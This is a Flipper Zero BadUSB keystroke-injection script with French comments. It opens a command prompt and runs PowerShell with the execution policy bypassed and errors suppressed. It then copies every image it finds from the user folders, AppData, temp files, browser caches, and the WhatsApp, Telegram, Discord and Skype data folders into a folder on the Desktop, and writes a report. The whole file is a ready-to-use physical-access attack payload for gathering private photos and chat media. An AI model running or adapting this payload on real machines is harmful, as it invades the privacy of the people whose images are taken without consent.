REM ================================================================
REM Flipper Zero BadUSB - Extracteur d'Images Complet
REM ================================================================
REM Nom: Extraction Complète (Full Extract)
REM Description: Extraction complète de toutes les images du système
REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
REM Auteur: Plume-Paopedia
REM Version: 1.0
REM Durée: 10-30 minutes (selon la quantité d'images)
REM Privilèges: Utilisateur standard (pas d'admin requis)
REM ================================================================

DEFAULT_DELAY 300

REM Ouverture de l'invite de commandes avec titre personnalisé
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000

REM Configuration de l'environnement
STRING title Extracteur d'Images Complet - Flipper Zero
ENTER
DELAY 300
STRING cd %USERPROFILE%\Desktop
ENTER
DELAY 300
STRING mkdir Images_Extraction_Complete_%DATE:~-4%-%DATE:~3,2%-%DATE:~0,2% >nul 2>&1
ENTER
DELAY 300
STRING cd Images_Extraction_Complete_%DATE:~-4%-%DATE:~3,2%-%DATE:~0,2%
ENTER
DELAY 500

REM Message d'accueil avec barre de progression ASCII
STRING echo ╔════════════════════════════════════════════════════════════════╗
ENTER
STRING echo ║                EXTRACTEUR D'IMAGES COMPLET                     ║
ENTER
STRING echo ║                    Flipper Zero BadUSB                         ║
ENTER  
STRING echo ║                                                                ║
ENTER
STRING echo ║ Ce processus peut prendre 10-30 minutes selon votre système   ║
ENTER
STRING echo ║ Toutes les images seront copiées dans ce dossier              ║
ENTER
STRING echo ╚════════════════════════════════════════════════════════════════╝
ENTER
DELAY 1000

REM Script PowerShell principal pour extraction complète
STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command "& {
ENTER
DELAY 500

STRING try {
ENTER
STRING   # Configuration des variables globales
ENTER
STRING   $ErrorActionPreference = 'SilentlyContinue'
ENTER
STRING   $ProgressPreference = 'Continue'
ENTER
DELAY 200

STRING   # Extensions d'images supportées (format complet)
ENTER
STRING   $imageExtensions = @(
ENTER
STRING     '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.webp',
ENTER
STRING     '*.ico', '*.svg', '*.tiff', '*.tif', '*.raw', '*.heic',
ENTER
STRING     '*.jfif', '*.psd', '*.ai', '*.webm'
ENTER
STRING   )
ENTER
DELAY 200

STRING   # Emplacements de recherche complets
ENTER
STRING   $searchLocations = @(
ENTER
STRING     '$env:USERPROFILE\Pictures',
ENTER
STRING     '$env:USERPROFILE\Desktop',
ENTER
STRING     '$env:USERPROFILE\Documents',
ENTER
STRING     '$env:USERPROFILE\Downloads',
ENTER
STRING     '$env:USERPROFILE\Videos',
ENTER
STRING     '$env:USERPROFILE\Music',
ENTER
STRING     '$env:USERPROFILE\OneDrive',
ENTER
STRING     '$env:APPDATA',
ENTER
STRING     '$env:LOCALAPPDATA',
ENTER
STRING     '$env:USERPROFILE\AppData\Local\Packages',
ENTER
STRING     '$env:TEMP'
ENTER
STRING   )
ENTER
DELAY 300

REM Ajout des emplacements de cache des navigateurs
STRING   # Emplacements de cache des navigateurs
ENTER
STRING   $browserCaches = @(
ENTER
STRING     '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache',
ENTER
STRING     '$env:LOCALAPPDATA\Mozilla\Firefox\Profiles',
ENTER
STRING     '$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache',
ENTER
STRING     '$env:APPDATA\Opera Software\Opera Stable\Cache'
ENTER
STRING   )
ENTER
STRING   $searchLocations += $browserCaches
ENTER
DELAY 200

REM Ajout des emplacements d'applications de messagerie
STRING   # Applications de messagerie populaires
ENTER
STRING   $messagingApps = @(
ENTER
STRING     '$env:LOCALAPPDATA\WhatsApp\Cache',
ENTER
STRING     '$env:APPDATA\Telegram Desktop\tdata',
ENTER
STRING     '$env:APPDATA\discord\Cache',
ENTER
STRING     '$env:LOCALAPPDATA\Packages\Microsoft.SkypeApp*\LocalState'
ENTER
STRING   )
ENTER
STRING   $searchLocations += $messagingApps
ENTER
DELAY 300

STRING   # Variables de statistiques
ENTER
STRING   $totalFiles = 0
ENTER
STRING   $totalSize = 0
ENTER
STRING   $processedLocations = 0
ENTER
STRING   $startTime = Get-Date
ENTER
DELAY 200

STRING   Write-Host '🔍 Début du scan complet...' -ForegroundColor Green
ENTER
STRING   Write-Host '📁 Emplacements à scanner: ' $searchLocations.Count -ForegroundColor Yellow
ENTER
DELAY 300

REM Boucle principale d'extraction
STRING   foreach ($location in $searchLocations) {
ENTER
STRING     $processedLocations++
ENTER
STRING     $locationPath = $ExecutionContext.InvokeCommand.ExpandString($location)
ENTER
STRING     
ENTER
STRING     if (Test-Path $locationPath) {
ENTER
STRING       $percentComplete = [math]::Round(($processedLocations / $searchLocations.Count) * 100, 1)
ENTER
STRING       Write-Progress -Activity 'Extraction d images' -Status 'Scan: $locationPath' -PercentComplete $percentComplete
ENTER
DELAY 200

STRING       Write-Host '📂 Scan: ' ([System.IO.Path]::GetFileName($locationPath)) -ForegroundColor Cyan
ENTER
STRING       
ENTER
STRING       foreach ($extension in $imageExtensions) {
ENTER
STRING         try {
ENTER
STRING           $files = Get-ChildItem -Path $locationPath -Filter $extension -Recurse -Force -ErrorAction SilentlyContinue | 
ENTER
STRING                    Where-Object { -not $_.PSIsContainer -and $_.Length -gt 0 -and $_.Length -lt 1GB }
ENTER
DELAY 200

STRING           foreach ($file in $files) {
ENTER
STRING             try {
ENTER
STRING               # Génération d'un nom unique pour éviter les conflits
ENTER
STRING               $timestamp = $file.LastWriteTime.ToString('yyyyMMdd_HHmmss')
ENTER
STRING               $parentFolder = $file.Directory.Name
ENTER
STRING               $uniqueName = $timestamp + '_' + $parentFolder + '_' + $file.Name
ENTER
STRING               
ENTER
STRING               # Copie du fichier avec gestion d'erreur
ENTER
STRING               Copy-Item $file.FullName -Destination .\$uniqueName -ErrorAction SilentlyContinue
ENTER
STRING               
ENTER
STRING               if ($?) {
ENTER
STRING                 $totalFiles++
ENTER
STRING                 $totalSize += $file.Length
ENTER
STRING                 
ENTER
STRING                 # Affichage du progrès tous les 25 fichiers
ENTER
STRING                 if ($totalFiles % 25 -eq 0) {
ENTER
STRING                   $sizeMB = [math]::Round($totalSize / 1MB, 2)
ENTER
STRING                   Write-Host '✅ ' $totalFiles ' images | ' $sizeMB ' MB' -ForegroundColor Green
ENTER
STRING                 }
ENTER
STRING               }
ENTER
STRING             } catch {
ENTER
STRING               # Gestion silencieuse des erreurs de fichier
ENTER
STRING               continue
ENTER
STRING             }
ENTER
STRING           }
ENTER
STRING         } catch {
ENTER
STRING           # Gestion silencieuse des erreurs d'extension
ENTER
STRING           continue  
ENTER
STRING         }
ENTER
STRING       }
ENTER
STRING     } else {
ENTER
STRING       Write-Host '⚠️  Dossier inaccessible: ' ([System.IO.Path]::GetFileName($locationPath)) -ForegroundColor DarkYellow
ENTER
STRING     }
ENTER
STRING   }
ENTER
DELAY 500

REM Finalisation et rapport détaillé
STRING   Write-Progress -Activity 'Extraction d images' -Completed
ENTER
STRING   $endTime = Get-Date
ENTER
STRING   $duration = $endTime - $startTime
ENTER
DELAY 200

STRING   # Affichage du rapport final
ENTER
STRING   Clear-Host
ENTER
STRING   Write-Host '╔════════════════════════════════════════════════════════════════╗' -ForegroundColor Green
ENTER
STRING   Write-Host '║                    EXTRACTION TERMINÉE                        ║' -ForegroundColor Green
ENTER
STRING   Write-Host '╚════════════════════════════════════════════════════════════════╝' -ForegroundColor Green
ENTER
STRING   Write-Host ''
ENTER
STRING   Write-Host '📊 STATISTIQUES DÉTAILLÉES:' -ForegroundColor Yellow
ENTER
STRING   Write-Host '   • Images extraites: ' $totalFiles -ForegroundColor White
ENTER
STRING   Write-Host '   • Taille totale: ' ([math]::Round($totalSize/1MB,2)) ' MB' -ForegroundColor White
ENTER
STRING   Write-Host '   • Durée: ' $duration.ToString('hh\:mm\:ss') -ForegroundColor White
ENTER
STRING   Write-Host '   • Emplacements scannés: ' $searchLocations.Count -ForegroundColor White
ENTER
STRING   Write-Host '   • Vitesse moyenne: ' ([math]::Round($totalFiles/$duration.TotalMinutes,1)) ' images/min' -ForegroundColor White
ENTER
DELAY 300

REM Création du rapport détaillé
STRING   # Génération du rapport CSV détaillé
ENTER
STRING   $reportData = @()
ENTER
STRING   Get-ChildItem -Path . -File | ForEach-Object {
ENTER
STRING     if ($_.Name -ne 'RAPPORT_EXTRACTION_COMPLETE.txt' -and $_.Name -ne 'STATISTIQUES_EXTRACTION.csv') {
ENTER
STRING       $reportData += [PSCustomObject]@{
ENTER
STRING         'Nom_Fichier' = $_.Name
ENTER
STRING         'Taille_MB' = [math]::Round($_.Length/1MB,3)
ENTER
STRING         'Date_Modification' = $_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
ENTER
STRING         'Extension' = $_.Extension.ToUpper()
ENTER
STRING       }
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING   $reportData | Export-Csv -Path '.\STATISTIQUES_EXTRACTION.csv' -NoTypeInformation -Encoding UTF8
ENTER
DELAY 200

STRING   # Création du rapport textuel
ENTER
STRING   $textReport = @(
ENTER
STRING     '═══════════════════════════════════════════════════════════════════',
ENTER
STRING     'RAPPORT D EXTRACTION COMPLÈTE D IMAGES',
ENTER
STRING     'Généré le: ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),
ENTER
STRING     '═══════════════════════════════════════════════════════════════════',
ENTER
STRING     '',
ENTER
STRING     'RÉSULTATS:',
ENTER
STRING     '• Images extraites: ' + $totalFiles,
ENTER
STRING     '• Taille totale: ' + ([math]::Round($totalSize/1MB,2)) + ' MB',
ENTER
STRING     '• Durée d extraction: ' + $duration.ToString('hh\:mm\:ss'),
ENTER
STRING     '• Vitesse moyenne: ' + ([math]::Round($totalFiles/$duration.TotalMinutes,1)) + ' images/minute',
ENTER
STRING     '',
ENTER
STRING     'EMPLACEMENTS SCANNÉS: ' + $searchLocations.Count,
ENTER
STRING     ($searchLocations | ForEach-Object { '• ' + $_ }),
ENTER
STRING     '',
ENTER
STRING     'FORMATS SUPPORTÉS:',
ENTER
STRING     ($imageExtensions | ForEach-Object { '• ' + $_ }),
ENTER
STRING     '',
ENTER
STRING     'NOTE: Consultez STATISTIQUES_EXTRACTION.csv pour le détail par fichier',
ENTER
STRING     '═══════════════════════════════════════════════════════════════════'
ENTER
STRING   )
ENTER
STRING   $textReport | Out-File -FilePath '.\RAPPORT_EXTRACTION_COMPLETE.txt' -Encoding UTF8
ENTER
DELAY 300

STRING } catch {
ENTER
STRING   Write-Host '❌ Erreur PowerShell: ' $_.Exception.Message -ForegroundColor Red
ENTER
STRING   Write-Host '🔄 Tentative de basculement vers CMD...' -ForegroundColor Yellow
ENTER
STRING   
ENTER
STRING   # Script de fallback CMD basique
ENTER
STRING   cmd /c 'echo Extraction CMD basique en cours... & for /r %USERPROFILE%\Pictures %i in (*.jpg *.png *.gif) do @copy "%i" . >nul 2>&1'
ENTER
STRING }
ENTER

STRING }"
ENTER
DELAY 3000

REM Ouverture automatique des résultats
STRING echo.
ENTER
STRING echo 🎉 Extraction complète terminée!
ENTER
STRING echo 📂 Ouverture du dossier de résultats...
ENTER
DELAY 500
STRING explorer .
ENTER
DELAY 1000

REM Message de fin avec instructions
STRING echo.
ENTER
STRING echo ═══════════════════════════════════════════════════════════════
ENTER
STRING echo Extraction complète terminée avec succès!
ENTER
STRING echo.
ENTER  
STRING echo 📁 Vérifiez le dossier: Images_Extraction_Complete_%DATE:~-4%-%DATE:~3,2%-%DATE:~0,2%
ENTER
STRING echo 📊 Consultez les fichiers de rapport pour les détails
ENTER
STRING echo.
ENTER
STRING echo Appuyez sur une touche pour fermer cette fenêtre...
ENTER
STRING echo ═══════════════════════════════════════════════════════════════
ENTER
STRING pause >nul
ENTER
STRING exit
ENTER